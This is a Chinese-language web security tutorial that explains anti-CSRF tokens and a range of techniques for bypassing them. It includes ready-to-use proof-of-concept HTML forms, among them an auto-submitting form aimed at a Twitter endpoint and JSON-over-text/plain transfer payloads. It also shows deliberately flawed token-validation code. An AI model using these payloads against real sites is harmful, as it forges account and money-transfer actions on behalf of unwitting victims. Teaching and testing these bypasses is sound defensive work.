## 反 CSRF 令牌

由于 CSRF 攻击能够成功的首要条件是请求中的所有参数都是可预测的并且对攻击者已知，因此最合乎逻辑的防御是以挑战-响应机制的形式向请求添加随机值。这通常被称为反 CSRF 令牌。这意味着此防御的基础在于令牌值经过加密随机化，攻击者无法预测。现代框架通常会生成特定于会话的反 CSRF 令牌，或针对特定用户操作生成。

然后，这些令牌会包含在后续请求中，作为隐藏表单字段、HTTP 标头或 URL 参数的一部分。服务器随后在每个请求上验证令牌，以确认其与会话或特定操作的预期值匹配。

考虑以下示例：表单包含一个随机生成的 `csrf_token`，包含在 HTML 表单隐藏参数中。

**请求**
```html
<form action="www.vulnerablebank.com/transfer.php" method="POST">
    <input type="hidden" name="to_account" value="123456789" />
    <input type="hidden" name="amount" value="1000" />
    <input type="hidden" name="currency" value="usd" />
    <input type="hidden" name="csrf_token" value="sx555xasff1asfasv15aa52321DDADSF" />
    <input type="submit" value="Submit" />
</form>
```

虽然现代开发框架已经实现了安全的方法来随机生成和管理反 CSRF 令牌，但仍有一些情况下令牌值薄弱/可预测。使用可预测值的一个示例是使用用户名和出生日期生成 CSRF 令牌。

CSRF 漏洞通常源于对 CSRF 令牌的验证存在缺陷。

## 绕过 CSRF 防御

根据所针对的应用，攻击者可能只需很少的努力就能绕过抗 CSRF 防御。

### 更改请求方法 —— CSRF 令牌的验证依赖于请求方法

更改请求方法：有时站点会为同一端点接受多种请求方法，但并非每种方法都设置了保护。通过更改请求方法，你可能能够在未遇到 CSRF 保护的情况下执行操作。

例如，假设密码更改端点的 POST 请求受 CSRF 令牌保护，如下所示：

```http
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE

(POST request body)
new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
```

你可以尝试以 GET 请求发送相同请求，看看能否不提供 CSRF 令牌而成功：

```http
GET /password_change?new_password=abc123
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE
```

若方法转换可行，在 cookie samesite 的默认设置下，基于顶级导航的自动 GET 可成功执行

### 移除 CSRF 参数 —— 未验证的 CSRF 令牌

仅仅因为站点使用 CSRF 令牌，并不意味着它正确验证了这些令牌。在某些情况下，CSRF 令牌可能是随机生成且加密安全的，但由于实现缺陷，服务器端缺乏验证。
- 存在但未被使用
- 在令牌存在时正确验证，但如果省略令牌则跳过验证

让我们看一个来自安全研究员 Prakhar Prasad 发现的漏洞的真实示例。该漏洞存在于 `translate.twitter.com` 功能中，该功能允许用户更新基本账户设置。

以下是执行此操作的请求示例：

**请求**
```http
POST /user/update HTTP/1.1
Cookie: <cookies>

utf8=✓&_method=put&authenticity_token=B6PJGp2Hkm1zi6lVN/IueNd7QqlAhIfM5C1pht1MzE8=&user[id]=809244&user[badging_exempted]=0&user[receive_badge_email]=0
```

在此请求中，`authenticity_token` 参数包含与请求正文一起发送的反 CSRF 令牌。安全研究员发现，通过从请求中删除 `authenticity_token` 参数并提交，请求仍然成功。此漏洞允许绕过 CSRF 保护。

以下是研究员使用的最终 POC 示例：

**POC**
```html
<body onload=document.getElementById('xsrf').submit()>
    <form id='xsrf' method="post" action="http://translate.twttr.com/user/update">
        <input type='hidden' name='user[badging_exempted]' value='0'></input>
        <input type='hidden' name='user[id]=user[id]' value='809244'></input>
        <input type='hidden' name='user[receive_badge_email]' value='0'></input>
    </form>
</body>
```

在此 POC 中，`<body>` 标签与 `onload` 事件处理程序结合使用，以自动提交表单，无需用户交互。

删除令牌参数或发送空白令牌通常有效，因为存在常见的应用程序逻辑错误。应用程序有时仅在令牌存在或令牌参数非空时才检查令牌的有效性。不安全应用程序的验证机制代码可能大致如下：

```python
def validate_token():
    if request.csrf_token == session.csrf_token: ①
        pass
    else:
        throw_error("CSRF token incorrect. Request rejected.") ②
    [...]

def process_state_changing_action():
    if request.csrf_token:
        validate_token()
    execute_action() ③
```

这段 Python 代码首先检查 CSRF 令牌是否存在 ①。如果存在，代码将继续验证令牌。如果令牌有效，代码继续执行。如果令牌无效，代码将停止执行并产生错误 ②。另一方面，如果令牌不存在，代码将跳过验证并立即执行操作 ③。在这种情况下，发送不带令牌或令牌为空的请求可能导致服务器根本不尝试验证令牌。


### 令牌池

尝试使用另一个会话的 CSRF 令牌提交请求。这有时有效，因为某些应用程序可能仅检查令牌是否有效：
- 应用程序维护一个已颁发令牌的全局池，并接受出现在该池中的任何令牌，而不确认它是否属于当前用户。
- 仅检查 CSRF 令牌的结构是否合法，不确认是否属于当前用户，甚至与令牌是否颁发无关
    - 某些服务器会尝试拒绝结构上与合法请求不够相似的请求。因此，可能需要一些努力来模拟有效请求的结构和数据。

在这种情况下，攻击者可以使用自己的账户登录应用程序，获取有效令牌，然后在 CSRF 载荷中包含该令牌。
- 探测时，使用2个账户，模拟攻击者与受害者

令牌之后可以通过多种方式附加到请求中，例如通过 Linux 或 macOS 终端的 `curl` 请求：

```bash
curl https://website.com/auth \
  -H "anti-csrf-token": "12345abc"
```

有缺陷的应用程序逻辑可能如下所示：

```python
def validate_token():
    if request.csrf_token:
        if request.csrf_token in valid_csrf_tokens: ①
            pass
        else:
            throw_error("CSRF token incorrect. Request rejected.")
    [...]

def process_state_changing_action():
    validate_token()
    execute_action() ②
```

这里的 Python 代码首先验证 CSRF 令牌。如果令牌在当前有效令牌列表中 ①，则继续执行并执行状态更改操作 ②。否则，生成错误并停止执行。如果是这种情况，你可以将自己的 CSRF 令牌插入恶意请求


### 使用已知 cookie 注入漏洞绕过双重 CSRF 令牌

站点也常用 cookie 与请求体参数的双重 csrf 令牌作为 CSRF 防御：

- 每个令牌在 Cookie 和请求参数中重复，服务器检查两个值是否相等。
    - 完全使用客户端保存状态

- Cookie 和请求参数的两个 csrf 相绑定，但并不绑定用户会话 cookie。
    - 当应用程序使用两个不同的框架（一个用于会话处理，一个用于 CSRF 保护）且未集成在一起时，很容易出现这种情况（即，会话 cookie 使用单独组件，而双重 csrf 双重令牌 cookie 与 post 体参数使用另一个组件）

通常，攻击者不具备更改其他用户 Cookie 的能力。若已存在漏洞使得受害者浏览器发送伪造的 Cookie，即可执行 CSRF。
- 子域名（设置主域 cookie）
- XSS（document.cookie）
- 服务器响应头部注入（Set-Cookie）

攻击将分为两步：
1. 使用已知 cookie 注入技术设置 cookie 中的 csrf 令牌字段到受害者浏览器
2. 使用与 cookie 中的 csrf 令牌相同或绑定的请求体参数 csrf 令牌执行攻击

### 弱令牌

以可预测方式生成的 CSRF 令牌，例如使用日期、时间、用户名或迭代整数值，可以被模拟和伪造。在评估使用抗 CSRF 令牌的应用的弱点时，请仔细查看生成的 CSRF 令牌的结构。

例如，考虑以下弱 CSRF 令牌：`1691434927`、`1691434928`。经过进一步评估，您可以确定这些 CSRF 令牌实际上是 Unix 纪元时间戳（它们表示自 1970 年 1 月 1 日 00:00:00 UTC 以来经过的毫秒数）。通过理解这些令牌的生成机制，您可以开始伪造类似的令牌，这些令牌将被生成它们的服务端验证器接受。在这个特定示例中，于 2023 年 8 月 7 日晚上 8:04:36 通过网络发送的 CSRF 载荷，使用包含内容 `1691438676` 的伪造 CSRF 令牌将成功验证。




### 通过 XSS 突破反 CSRF 防御

因为XSS有效载荷在本站执行，可以与应用程序进行双向交互，所以它们能够从应用程序的响应中获取令牌，并在随后的请求中提交这些令牌。

然而，如果某个包含反射型XSS漏洞的页面受到反CSRF防御机制保护，那么这种漏洞并不能直接用于突破防御。

通常，在下面几种情况下，我们可以利用XSS漏洞突破反CSRF防御。

- 如果受保护的功能中存在任何XSS漏洞，那么攻击者总可以利用这些漏洞突破反CSRF防御。通过保存型攻击注入的JavaScript可直接读取脚本所在的应用程序响应中的令牌。

- 如果应用程序仅对一部分通过验证的功能实施反CSRF防御，并且某项未防御CSRF的功能中存在一个反射型XSS漏洞，那么攻击者就可以利用这个漏洞来突破反CSRF防御。例如，如果应用程序仅采用反CSRF令牌保护转账功能的第二个步骤，那么攻击者就可以利用反射型XSS攻击从其他步骤中突破防御。通过这个漏洞注入的一段脚本可以向第一个转账步骤提出一个站内请求，截取令牌，然后使用这个令牌进入第二个步骤。攻击之所以能够成功，是因为第一个没有采取CSRF防御的转账步骤返回了访问受保护页面所需的令牌。仅依赖HTTP cookie实现第一个步骤，意味着攻击者可以利用它访问保护第二个步骤的令牌，从而实施有效攻击。

- 在某些应用程序中，反CSRF令牌仅与当前用户相关联，而不是与用户的会话相关联。在这种情况下，如果登录表单未防范CSRF攻击，则应用程序仍有可能受到多阶段攻击。首先，攻击者使用自己的账户登录，获得一个与他的用户身份关联的有效反CSRF令牌。然后，攻击者对登录表单发动CSRF攻击，迫使受害用户使用他的证书登录，如上文介绍利用相同用户的保存型XSS漏洞时所述。一旦用户作为攻击者登录，攻击者将使用CSRF使用户提出相关请求，对XSS漏洞加以利用，同时使用他此前获得的反CSRF令牌。然后，攻击者的XSS有效载荷将在用户的浏览器中执行。由于用户仍然作为攻击者登录，XSS有效载荷可能需要使用户注销，然后诱使用户再次登录，最终，用户的登录证书和生成的应用程序会话都被完全攻破。

- 如果反CSRF令牌未与用户关联，而是与当前会话关联，且攻击者可以通过某种方法在用户的浏览器中注入cookie，则只需对以上攻击稍作修改即可。这时，攻击者不是使用自己的证书针对登录表单实施CSRF攻击，而可以直接向用户传送他当前的会话令牌及与该会话关联的反CSRF令牌。然后，该攻击的剩余部分与之前所述的步骤相同。

### 内容类型

如果服务器期望特定的内容类型，例如 `application/json`，如果您发送带有 `application/x-url-encoded` 或 `form-multipart` 的载荷，它可能会表现不同。这些替代内容类型可能会跳过验证步骤，并允许您的 CSRF 攻击成功。

在极少数情况下，以下内容类型可能绕过验证：

- `application/x-7z-compressed`
- `application/zip`
- `application/pdf`
- `application/ld+json`
- `application/gzip`
- `text/csv`
- `application/xml`
- `application/xhtml+xml`
- `application/rtf`
- `text/css`

内容类型在所有请求中作为 HTTP 头部声明：

```http
Content-Type: text/html; charset=utf-8
Content-Type: multipart/form-data;
```

HTTP 表单将内容类型作为属性 `enctype` 包含：

```html
<form action="/" method="post" enctype="multipart/form-data">
  <button type="submit">Submit</button>
</form>
```

在 HTTP 表单的情况下，只需打开浏览器开发者工具并编辑 `enctype` 字段，就会强制浏览器在表单提交时修改其随 HTTP 请求发送的内容类型。

#### 利用基于 JSON 的 CSRF

JSON 已成为现代 Web 应用程序最流行的数据交换格式。在处理涉及 JSON 请求的 CSRF 时，需要考虑一些方面。例如，期望 JSON 数据的 Web 应用程序可能会拒绝查询字符串并将其视为格式错误的请求。因此，JSON 必须正确格式化。让我们探讨几种场景：

##### 场景 1：缺少 Content-Type 验证和 JSON 格式化

在此场景中，JSON 解析器既不验证 `Content-Type` 标头，也不检查 POST 数据是否格式正确。同样，它也不会检查 POST 数据中是否存在尾随字符。

为了说明，我们以 `vulnerablebank.com` 为例，但这次 POST 参数以 JSON 格式编码：

**请求**
```http
POST /transfer.php HTTP/1.1
Host: www.vulnerablebank.com
Cookie: PHPSESSID=3e5a8b24b7467fd7e4791ab33412aff1
Content-Type: application/json

{
    "to_account": "098855455",
    "amount": "1000",
    "currency": "usd"
}
```

攻击者可以通过发送一个 HTML 表单来利用此漏洞，该表单将 JSON 有效载荷作为参数包含在内，但编码为 `text/plain`。这将允许 JSON 有效载荷无障碍地传递，整个 JSON 有效载荷作为参数名称发送。

**POC：**
```html
<html>
    <form action="http://localhost:9000/CSRF-JSON/transfer.php" method="post" enctype="text/plain">
        <input name='{"to_account":"098855455","amount":"1000","currency":"usd"}' type='hidden'>
        <input type="submit">
    </form>
</html>
```

服务器将收到一个请求体中值为空的 POST 请求
```json
{"to_account":"098855455","amount":"1000","currency":"usd"}=
```

##### 场景 2：Content-Type 未验证，但 JSON 语法被验证

在此场景中，JSON 解析器不验证 `Content-Type` 标头，但会强制执行严格的解析规则。在这种情况下，由于尾随的 `=` 字符，请求将被拒绝。

为了克服此限制，我们在 JSON 有效载荷中添加一个名为 `dummy_param` 的虚拟参数，以确保正确的格式。服务器在处理过程中通常会忽略虚拟参数，从而使 CSRF 攻击可行。

**POC：**
```html
<html>
    <form action="www.vulnerablebank.com/transfer.php" method="post" enctype="text/plain">
        <input name='{"to_account":"098855455","amount":"1000","currency":"usd","dummy_param":"' value='test"}' type='hidden'>
        <input type="submit">
    </form>
</html>
```

```json
{"to_account":"098855455","amount":"1000","currency":"usd","dummy_param":"=test"}
```

##### 场景 3：服务器期望 application/json Content-Type 标头

如果服务器期望请求中包含 `application/json` 内容类型标头，则使用 XHR（XMLHttpRequest）发出的任何跨源请求都将因同源策略（SOP）而被浏览器阻止。

在 HTML5 之前的时代，Flash 和 Silverlight 等技术允许用户通过添加自定义标头来规避此类限制；然而，在现代 Web 应用程序中利用此场景需要寻找 CORS（跨域资源共享）错误配置，这将在 HTML5 章节中详细介绍。

### 正则表达式过滤器绕过

如果服务器验证使用正则表达式来检测 CSRF 载荷，编写 URL 的替代方法可能会绕过所述正则表达式。示例如下：

- 某些服务器在定义从哪里开始读取查询参数时，除了问号（`?`）外，还接受分号（`;`）。例如，查询 `https://example.com?test=123` 可以写成 `https://example.com;test=123`。
- 某些服务器在定义文件位置时接受正斜杠或反斜杠，例如 `https://example.com/test` 或 `https://example.com\test`。
- 配置不当的服务器会接受相对位置符号（`..`）。例如，`https://example.com/../test`。

确定服务器用于验证的特定正则表达式可能很困难，因此当不确定时，首先尝试针对在搜索引擎上找到的最常见验证器正则表达式进行绕过（许多开发者并不自己设计正则表达式）
